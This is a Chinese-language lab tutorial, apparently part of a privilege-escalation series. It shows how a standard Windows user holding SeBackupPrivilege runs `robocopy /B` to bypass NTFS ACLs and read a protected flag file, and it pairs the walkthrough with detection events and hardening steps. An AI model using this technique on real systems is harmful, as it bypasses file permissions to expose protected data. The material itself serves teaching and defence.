# Day 23：whoami /priv 不只是清單：SeBackupPrivilege 到底給了什麼能力？

## 開場情境

`whoami /priv` 你已經打過很多次了。但你真的看懂每一行嗎？

今天 fei-student 的 Token 裡多了一個 Privilege：`SeBackupPrivilege`。它顯示為「已停用」。

> 「已停用」代表安全嗎？一個看起來只是「備份權限」的東西，怎麼可能用來提權？

---

## 今天要解決的問題

1. Windows Access Token 裡的 Privilege 到底是什麼？
2. Present / Enabled / Disabled 三種狀態有什麼差別？
3. SeBackupPrivilege 為什麼危險？
4. Backup Semantics 如何繞過 NTFS ACL？
5. 為什麼這個 Lab 需要特殊的環境前置條件？

---

## 背景知識：Windows Access Token

![Windows Access Token](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day23-token-privileges-diagram-01.png)


每個 Windows Process 啟動時都會拿到一個 Access Token，這個 Token 決定了 Process 的「有效身份」：


### Privilege 的三種狀態

| 狀態 | `whoami /priv` 顯示 | 意義 |
|------|---------------------|------|
| **Present + Enabled** | `已啟用` | Process 可以直接使用 |
| **Present + Disabled** | `已停用` | Token 中有，但 Process 需要自己 enable |
| **Absent** | 不顯示 | Token 中沒有，完全無法使用 |

**關鍵理解**：`已停用` ≠ 安全。很多工具會自動啟用 Disabled 的 privilege。

---

## OS 原理：SeBackupPrivilege 與 Backup Semantics

### 正常檔案存取

```
Process → CreateFile("flag.txt") → 檢查 NTFS DACL → Access Denied
```

### 加上 Backup Semantics

![Backup Semantics](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day23-token-privileges-diagram-02.png)



設計目的：讓備份軟體可以備份所有檔案，即使某些檔案的 ACL 不允許備份帳號讀取。

### 哪些工具支援 Backup Semantics？

| 工具 | 支援 | 備註 |
|------|------|------|
| `robocopy /B` | ✅ | Windows 內建 |
| `wbadmin` | ✅ | Windows 備份工具 |
| 自訂程式 + `CreateFile(FILE_FLAG_BACKUP_SEMANTICS)` | ✅ | 需要 P/Invoke |
| 一般 `type` / `copy` | ❌ | 不使用 backup semantics |

---

## Lab 環境

```
🔬 FEI Lab 環境
VM: FEI-PRIVESC-WINDOWS
OS: Windows 10 Pro (Build 19045)
起始帳號: fei-student (Standard User + SeBackupPrivilege)
目標: 讀取受保護的 Flag
Flag: C:\FEI-PrivEsc\Flags\fei-w08-backup-flag.txt

⚠️ Lab 特殊前置條件：
1. fei-student 加入 Backup Operators 群組
2. EnableLUA = 0（UAC 停用）
3. 需要重新登入取得新 Token
```

### 為什麼需要停用 UAC？

![UAC 對 SeBackupPrivilege 的影響](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day23-token-privileges-diagram-03.png)


> ⚠️ **這是 Lab 環境的特殊需求，不代表所有環境都需要停用 UAC。**

在 Windows 10 上，Backup Operators 群組的成員會被 UAC 的 Token Splitting 影響：


在真實環境中，以下情況不需要停用 UAC 也能利用：
- Windows Server（很多 Server 預設 UAC 較寬鬆）
- Service Account（不受 UAC Split 影響）
- 已提升的 Session（High Integrity）

---

## 如果我是攻擊者，我現在想知道什麼？

### Step 1：我的 Token 有什麼？

```cmd
whoami /priv
```

```
特殊權限名稱                  描述               狀況
============================= ================== ======
SeBackupPrivilege             備份檔案及目錄     已停用
SeShutdownPrivilege           關閉系統           已停用
SeChangeNotifyPrivilege       略過周遊檢查       已啟用
```

看到 `SeBackupPrivilege`！雖然「已停用」。

### Step 2：Flag 可以直接讀嗎？

```cmd
type "C:\FEI-PrivEsc\Flags\fei-w08-backup-flag.txt"
```

```
存取被拒。
```

正常 ACL 擋住了。

### Step 3：用 Backup Semantics 繞過

```cmd
robocopy "C:\FEI-PrivEsc\Flags" "C:\Users\fei-student\Desktop" fei-w08-backup-flag.txt /B
```

```
        新檔案           46    fei-w08-backup-flag.txt
                         100%
```

成功！

### Step 4：讀取

```cmd
type C:\Users\fei-student\Desktop\fei-w08-backup-flag.txt
```

```
FEI{WINDOWS_W08_SEBACKUP_PRIVILEGED_READ}
```

---

## Attack Path

![Token Privileges Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day23-token-privileges-diagram-04.png)



---



### 場景準備

`powershell
# 1. 以 fei-labadmin 登入 Windows VM（VMware Console）
# 密碼：FEI-LabAdmin-2026!

# 2. 以系統管理員開啟 PowerShell，進入場景目錄
cd C:\FEI-PrivEsc\Scenarios\FEI-W08-TOKEN-PRIVILEGES

# 3. 執行 setup
.\fei-setup.ps1

# 4. 確認場景就緒
.\fei-verify.ps1
# 應看到 W08-TOKEN-PRIVILEGES STATUS: READY

# 5. 登出，改以 fei-student 登入
# 密碼：FEI-Student-2026!
`

## Attack Reasoning

![Token Privileges Attack Reasoning](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day23-token-privileges-diagram-05.png)



---

## False Positive

### 「whoami /priv 看到 Privilege 就能用」嗎？

不一定。三種情況：

| 情況 | 能用嗎？ |
|------|---------|
| Present + Enabled | ✅ 直接可用 |
| Present + Disabled | ⚠️ 取決於能否 enable |
| Present + UAC Filtered | ❌ 無法 enable（error 1300）|

在 W08 Lab 建置過程中，我們發現：即使 `whoami /priv` 顯示 SeBackupPrivilege「已停用」，在 UAC Split Token 下的 AdjustTokenPrivileges 會回傳 ERROR 1300（NOT_ALL_ASSIGNED），privilege 無法被啟用。

**但 `robocopy /B` 作為 system utility，能正確 enable privilege。** 這和自訂程式的行為不同。

---

## Edge Case

### 為什麼自訂 C# Helper 失敗？

我們建了一個 C# 程式呼叫 `AdjustTokenPrivileges` + `CreateFile(FILE_FLAG_BACKUP_SEMANTICS)`：

```
OpenProcessToken: True
LookupPrivilege: True luid=17
AdjustToken: True err=1300  ← 失敗！
CreateFile: handle=-1 err=5  ← Access Denied
```

Error 1300 代表 Token 中的 privilege 無法被啟用。但 `robocopy /B` 可以。

**原因推測**：`robocopy.exe` 是 Windows system utility，可能使用不同的 API path 或有特殊的 manifest 設定，允許它在 filtered token 中啟用 backup privilege。自訂程式沒有這個待遇。

### Session Type 影響

| Session 類型 | SeBackupPrivilege |
|-------------|-------------------|
| Interactive (Console) | 可能受 UAC split |
| Batch (schtask) | 受限 |
| vmrun (non-interactive) | 受限 |
| Service | 不受 UAC split |

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| whoami /priv 沒有 SeBackupPrivilege | Policy 未設定 或 需要重新登入 | 確認 LSA Policy + logout/login |
| robocopy /B 「沒有備份權限」 | UAC token split | 確認 EnableLUA=0 |
| 自訂 helper error 1300 | vmrun session 或 UAC filter | 改用 robocopy /B |
| 修改 policy 後看不到 privilege | 舊 session 的 token | 必須重新登入 |

---

## 深入一層：Policy vs Token 的差距

這是 Phase 10 最重要的教學點：

```
User Rights Assignment（Policy）
≠
Current Process Token（實際權限）
```

Policy 改了，但你的 shell 的 Token 是在登入時建立的。Policy 修改**不會**影響已存在的 Token。必須重新登入。

同樣的概念在 Linux 上也存在：

```
/etc/group 修改了
≠
目前 shell 的 group membership 改了
```

Linux 也需要重新登入。

---

## FEI Lab 工程筆記

### Bug 1：secedit 寫入 username 而非 SID

setup 用 `secedit` 設定 User Rights，但寫入的是 `fei-student`（username）而非 `*S-1-5-...`（SID）。某些 Windows Build 不接受 username 格式。

**修正**：改用 Win32 LSA API (`LsaAddAccountRights`)。

### Bug 2：UAC Token Split

Backup Operators 群組也受 UAC Token Splitting 影響。成員的 Filtered Token 中，SeBackupPrivilege 存在但無法被 enable。

**修正**：setup 中停用 `EnableLUA`（+ 重開機）。

### Bug 3：robocopy vs custom helper

自訂 C# helper 呼叫 `AdjustTokenPrivileges` 失敗（error 1300）。但 `robocopy /B` 可以成功。

**修正**：攻擊路徑改用 `robocopy /B`（Windows built-in，不需額外工具）。

**教訓**：system utility 的 privilege 處理和自訂程式不同。在 Lab 設計中，優先選擇 built-in 工具作為 attack path。

---

## 防禦者怎麼看？

### Detect

```powershell
# 列出有 SeBackupPrivilege 的帳號
secedit /export /cfg C:\temp\secpol.cfg /areas USER_RIGHTS
Select-String "SeBackupPrivilege" C:\temp\secpol.cfg
```

- **Event ID 4673**：Sensitive privilege use
- **Sysmon**：Process 使用 backup semantics 存取檔案

### Prevent

1. 移除不必要的 Backup Operators 成員
2. 移除不必要的 SeBackupPrivilege 授權
3. 確認只有真正需要備份的 Service Account 有此權限
4. User Right 應由 Group Policy 管理，不要手動設定

### Fix Verification

```cmd
whoami /priv
# SeBackupPrivilege 不應出現

robocopy "C:\FEI-PrivEsc\Flags" C:\temp fei-w08-backup-flag.txt /B
# 應該回報「沒有備份權限」
```

---

## Detection

| 監控項目 | 方法 |
|---------|------|
| Privilege 使用 | Event 4673 |
| robocopy /B | Process Monitoring（command line 包含 /B）|
| Backup Operators 成員變更 | Event 4732/4733 |
| User Rights 修改 | Event 4704 |

---

## Exercise

1. 在你的 Windows 上執行 `whoami /priv`。你有哪些 privilege？哪些是 Enabled？哪些是 Disabled？
2. 如果一個 Service Account 有 SeBackupPrivilege + SeRestorePrivilege，它理論上可以做什麼？
3. 為什麼即使有 SeBackupPrivilege，在 UAC 環境下也不一定能用？

---

## Quiz

**Q1**：`whoami /priv` 顯示 `SeBackupPrivilege` 為「已停用」，代表安全嗎？

### 答案
不一定。「已停用」代表 Token 中有但尚未啟用。很多工具（如 robocopy /B）會自動啟用它。真正安全的是 privilege 根本不在 Token 中（不顯示）。


**Q2**：`robocopy /B` 和普通 `copy` 有什麼差別？

### 答案
`/B` flag 使用 Backup Semantics（FILE_FLAG_BACKUP_SEMANTICS），繞過 NTFS DACL。普通 `copy` 遵守正常 ACL 檢查。


**Q3**：修改了 User Rights Assignment 後，已開啟的 cmd.exe 會立即取得新 privilege 嗎？

### 答案
不會。Token 在 logon 時建立，之後不變。必須 logout + login 取得新 Token。




## 場景收尾

做完後記得 reset：

`powershell
# 以 fei-labadmin 的系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W08-TOKEN-PRIVILEGES
.\fei-reset.ps1
.\fei-verify.ps1 -Mode reset
# 應看到 W08-TOKEN-PRIVILEGES STATUS: RESET
`

---

## 今天真正要記住的 3 件事

1. **Disabled ≠ 安全** — Token 中的 privilege 即使「已停用」，也可能被工具 enable
2. **Policy 改了 ≠ Token 改了** — 必須重新登入
3. **System utility vs 自訂程式** — robocopy /B 可以做到自訂 helper 做不到的事

---

## 給自己的問題

> 如果 Service ACL 安全、Binary 安全、Registry 安全、Token 沒有特殊 privilege……但 Service 會從磁碟上載入一個 DLL，而那個目錄你可以寫入？

---

## 下一篇

Day 24：DLL Hijacking — SYSTEM Process 載入了誰控制的程式碼？
